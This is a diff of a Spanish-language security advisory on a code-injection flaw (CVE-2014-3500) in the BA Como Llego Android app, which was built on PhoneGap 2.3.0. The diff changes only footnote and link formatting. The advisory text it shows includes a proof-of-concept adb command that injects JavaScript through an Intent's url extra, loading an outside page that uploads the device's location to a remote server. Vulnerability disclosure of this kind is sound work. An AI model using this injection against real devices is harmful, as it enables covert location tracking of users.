@@ -22,7 +22,7 @@
 
 ## 2. Información de vulnerabilidades
 
-**Clase:** Inyección de código [[http://cwe.mitre.org/data/definitions/94.html](http://cwe.mitre.org/data/definitions/94.html)]
+**Clase:** [Inyección de código](http://cwe.mitre.org/data/definitions/94.html)
 
 **Impacto:** Perdida de datos
 
@@ -34,9 +34,9 @@
 
 ## 3. Descripción de vulnerabilidad
 
-La aplicación BA Como LLego [^1]: para Android permite consultar cómo viajar en colectivo, tren, subte, bicicleta, auto y a pie en la Ciudad de Buenos Aires, fue desarrollada por el Gobierno de la Ciudad de Buenos Aires y, a enero de 2017, cuenta con entre 1 y 5 millones de instalaciones según datos del mercado de aplicaciones Google Play.
+La aplicación BA Como LLego [1] para Android permite consultar cómo viajar en colectivo, tren, subte, bicicleta, auto y a pie en la Ciudad de Buenos Aires, fue desarrollada por el Gobierno de la Ciudad de Buenos Aires y, a enero de 2017, cuenta con entre 1 y 5 millones de instalaciones según datos del mercado de aplicaciones Google Play.
     
-La aplicación fue desarrollada usando Apache Cordova [^2]: (conocido también como PhoneGap), un framework de código abierto que permite construir aplicaciones para dispositivos móviles a partir de tecnología web standard. El framewok embebe en la aplicación móvil un motor de navegador web (conocido como WebView) adaptado a las características del dispositivo, para que el usuario pueda visualizar el contenido de una aplicación web. Este mecanismo permite a un desarrollador incorporar a dispositivos móviles, rápidamente y con poco esfuerzo de adaptación, aplicaciones web ya existentes o desarrolladas para otras plataformas. 
+La aplicación fue desarrollada usando Apache Cordova [2] (conocido también como PhoneGap), un framework de código abierto que permite construir aplicaciones para dispositivos móviles a partir de tecnología web standard. El framewok embebe en la aplicación móvil un motor de navegador web (conocido como WebView) adaptado a las características del dispositivo, para que el usuario pueda visualizar el contenido de una aplicación web. Este mecanismo permite a un desarrollador incorporar a dispositivos móviles, rápidamente y con poco esfuerzo de adaptación, aplicaciones web ya existentes o desarrolladas para otras plataformas. 
      
 El framework utilizado por la aplicación utiliza de WebView customizados para que un usuario pueda visualizar su contenido web. El problema de 
 estas vistas es que para aumentar la usabilidad de la aplicación, se rompe el sandbox de un browser habitual, permitiendo que un script dentro del
@@ -106,11 +106,11 @@ var watchID = navigator.geolocation.getCurrentPosition(onSuccess, onError, { tim
 
 ```
 
-BA ComoLLego versión 1 utiliza la versión de PhoneGap 2.3.0 que es vulnerable a CVE-2014-3500 [^3]: permitiendole a otras aplicaciones cambiar la página de inicio de la aplicación por una con contenido malicioso a través de un Intent que lleve un parámetro extra con referencia al contenido bajo la clave _url_. 
+BA ComoLLego versión 1 utiliza la versión de PhoneGap 2.3.0 que es vulnerable a CVE-2014-3500 [3] permitiendole a otras aplicaciones cambiar la página de inicio de la aplicación por una con contenido malicioso a través de un Intent que lleve un parámetro extra con referencia al contenido bajo la clave _url_. 
     
 La correcta configuración del framework podría llegar a bloquear dicho ataque cuando se restringen los dominios a los cuales la aplicación se puede conectar a través del archivo de configuración _res/xml/config.xml_. Sin embargo, BA ComoLlego permite a la aplicación acceder a cualquier dominio dado a que para filtrar los accesos utiliza un comodín.
     
-Como prueba de concepto que la aplicación es vulnerable a CVE-2014-3500 se puede enviar el siguiente comando a través de adb (Android Debug Bridge) que simularía ser una aplicación que envía un Intent malicioso que inyecta Javascript utilizando el módulo _Geolocation_[^4]: logrando que una aplicación sin permiso pueda subir remotamente la ubicación del dispositivo a un servidor remoto.
+Como prueba de concepto que la aplicación es vulnerable a CVE-2014-3500 se puede enviar el siguiente comando a través de adb (Android Debug Bridge) que simularía ser una aplicación que envía un Intent malicioso que inyecta Javascript utilizando el módulo _Geolocation_[4] logrando que una aplicación sin permiso pueda subir remotamente la ubicación del dispositivo a un servidor remoto.
   
 _adb shell am start -n ar.gob.buenosaires.comollego/.comollego --es url "https://googledrive.com/host/0B0f57xoYl_BFOG5FMEhpc3AzckU/upload_geo.html"_
 
